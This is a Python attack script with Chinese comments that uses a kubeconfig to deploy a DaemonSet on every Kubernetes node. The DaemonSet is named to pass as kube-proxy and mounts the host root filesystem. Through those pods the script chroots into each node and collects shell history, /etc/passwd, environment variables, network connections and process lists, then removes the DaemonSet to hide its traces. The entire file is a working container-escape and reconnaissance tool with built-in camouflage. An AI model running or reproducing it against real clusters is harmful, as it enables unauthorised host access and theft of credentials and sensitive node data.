# coding=utf-8
# @Time: 2021/8/17
# @Author: em0ty
# 通过Deamonset对集群内所有node均创建一个挂载根目录的pod，通过chroot实现在node上的信息收集

import os
import time
import argparse
import json

# 命令列表，需要执行的命令在这里添加。
cmds = [
    "ifconfig",
    "ls -al",
    "mount",
    "cat ~/.bash_history",
    "env",
    "whoami",
    "cat /etc/passwd",
    "ps -ef",
    "netstat -atunp",
    "ls -al /tmp",
  ]

daemonset_name = "kube-proxy-nginx-kgather"
mount_path = "/host"
label_app_name = "kgather"
config = ""
out_file = ""
screen = ""
test = ""


# 把结果写入文件
def write_results(results):
    with open(out_file, "a") as f:
        for result in results:
            f.writelines(result + "\n")

# 获取所有nodes
def get_nodes():
    result = ""
    cmd = "kubectl --kubeconfig {config} get nodes -o wide --all-namespaces".format(
        config=config
    )
    try:
        cmd_out = os.popen(cmd).read()
        if screen:
            print("执行命令：", cmd)
            print("输出结果：", cmd_out)
        result = "获取所有node 命令：{cmd}\n结果：\n{cmd_out}".format(cmd=cmd, cmd_out=cmd_out)
    except Exception as e:
        result = "执行命令出错：{cmd}".format(cmd=cmd)
    return [result]


# 获取kube-proxy的镜像，作为后续创建pod的基础镜像，解决拖取镜像的问题
def get_base_image():
    cmd = "kubectl  --kubeconfig {config}  get daemonset kube-proxy -n kube-system -o json".format(config=config)
    try:
        cmd_out = os.popen(cmd).read()
        if screen:
            print("执行命令：", cmd)
            print("输出结果：", cmd_out)
        tmp = json.loads(cmd_out)
        result = tmp["spec"]["template"]["spec"]["containers"][0]["image"]
        return result
    except Exception as e:
        print(e)
        print("[-]    获取kube-proxy的镜像失败,请手动指定镜像")
        os._exit(-1)

# 创建Daemonset
def create_daemonset(base_image):
    cmd = '''cat <<EOF | kubectl --kubeconfig {config}  create -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {deamonset_name}
spec:
  selector:
    matchLabels:
      k8s-app: {label_app_name1}
  template:
    metadata:
      labels:
        k8s-app: {label_app_name2}
    spec:
      hostNetwork: true 
      tolerations:
      - key:
        operator: Exists
        effect:
      containers:
      - name: kube-proxy-nginx-kgather-container
        image: {iamge}
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 60; done;"]
        volumeMounts:
        - name: host
          mountPath: {mount_path}
      volumes:
      - name: host
        hostPath:
          path: /
          type: Directory
'''.format(
        deamonset_name=daemonset_name,
        config=config,
        iamge=base_image,
        label_app_name1=label_app_name,
        label_app_name2=label_app_name,
        mount_path=mount_path
        )
    try:
        cmd_out = os.popen(cmd).read()
        if screen:
            print("执行命令：", cmd)
            print("输出结果：", cmd_out)
        if not "created" in cmd_out:
            raise RuntimeError('[-]   创建daemonset出现异常：',cmd_out)
        # print(cmd_out)
    except Exception as e:
        print(e)
        print("[-]    创建daemonset失败")
        os._exit(-1)


def get_pods():
    result = []
    cmd = "kubectl --kubeconfig {config} get pods -A -o wide --field-selector status.phase=Running -l k8s-app={app_name}".format(
        app_name=label_app_name,config=config)
    try:
        cmd_out = os.popen(cmd).read().strip()
        if screen:
            print("执行命令：", cmd)
            print("输出结果：", cmd_out)
        tmps = cmd_out.split("\n")
        for tmp in tmps[1:]:
            while "  " in tmp:
                tmp = tmp.replace("  ", " ")
            data = tmp.split(" ")
            result.append(
                {
                    "namespace":data[0],
                    "name":data[1],
                    "node":data[6]
                }
            )
        return result
    except Exception as e:
        print(e)
        print("[-]    获取daemonset的pods失败")
        os._exit(-1)


def nodes_info_gatehr(pods):
    cmd_tpl = "kubectl --kubeconfig {config} -n {namespace} exec {pod_name} -- chroot {mount_path} {cmd}"
    for pod in pods:
        namespace = pod["namespace"]
        pod_name = pod["name"]
        node = pod["node"]
        results = []
        write_results(["[+]开始收集：node:{node}的信息，基于：pod:{pod_name}，namespace:{namespace}".format(
            node=node,pod_name=pod_name,namespace=namespace
        )])
        for tmp_cmd in cmds:
            cmd = cmd_tpl.format(config=config, namespace=namespace,
                                 pod_name=pod_name, mount_path=mount_path,cmd=tmp_cmd)
            try:
                cmd_out = os.popen(cmd).read()
                if screen:
                    print("执行命令：", cmd)
                    print("输出结果：", cmd_out)
                result = "node:{node} \n命令：{cmd}\n结果：\n{cmd_out}".format(
                    node=node,
                    cmd=tmp_cmd,
                    cmd_out=cmd_out)
            except Exception as e:
                result = "node:{node},namespace:{namespace}，pod:{pod_name}，执行命令出错：{cmd}".format(
                    node=node,
                    namespace=namespace,
                    pod_name=pod_name,
                    cmd=tmp_cmd
                )
            results.append(result)
        write_results(results)
        print("[+]   完成{node},{pod_name}的信息获取".format(node=node,pod_name=pod_name))


def deltet_daemonset():
    cmd = "kubectl --kubeconfig {config} delete daemonset {daemonset_name}".format(
        config=config,
        daemonset_name=daemonset_name
    )
    try:
        cmd_out = os.popen(cmd).read()
        if screen:
            print("执行命令：",cmd)
            print("输出结果：",cmd_out)
        if not "deleted" in cmd_out:
            raise RuntimeError('[-]   删除daemonset出现异常：{cmd_out},daemonset_name:{daemonset_name}'.format(
                cmd_out=cmd_out,daemonset_name=daemonset_name)
            )
    except Exception as e:
        print(e)
        print("[-]    删除daemonset失败")
        os._exit(-1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config",
                        help='kubeconfig配置文件位置，默认使用~/.kube/config',
                        default="~/.kube/config")
    parser.add_argument("-o", "--out", help='输出文件，默认为./{time}_nodeinfo_out.txt',
                        default=time.strftime("%Y-%m-%d_%H:%M:%S_nodeinfo_out_out.txt", time.localtime()))
    parser.add_argument("-s", "--screen", help='结果同时输出到屏幕', action="store_true")
    # parser.add_argument("-t", "--test", help='测试模式，仅输出收集信息的命令不实际执行，判断命令是否正确。', action="store_true")
    parser.add_argument("-ti", "--time", help='创建daemonset的等待时间，默认等待30s', default=30)

    args = parser.parse_args()
    config = args.config
    out_file = args.out
    screen = args.screen
    # test = args.test
    ti = args.time
    print("[+] 开始 ")
    print("[+] 结果输出文件：",out_file)
    print("[+]   获取所有node的基础信息")
    nodes_result = get_nodes()
    write_results(nodes_result)

    print("[+] 开始创建Daemonset：",daemonset_name)
    print("[+]   获取kube-proxy的镜像")
    base_image = get_base_image()
    print("[+]   获取成功：",base_image)
    create_daemonset(base_image)
    print("[+]   创建deamonset成功")
    print("[+]   等待{time}s，待daemonset部署".format(time=str(ti)))
    time.sleep(ti)
    print("[+] 开始收集node信息")
    print("[+]   获取daemonset的pods")
    pods = get_pods()
    print("[+]   获取到处于runing状态的pod个数：",len(pods))
    nodes_info_gatehr(pods)
    print("[+]   收集node信息结束")
    deltet_daemonset()
    print("[+]  删除daemonset成功")
    print("[+]  结果已输出到文件：", out_file)

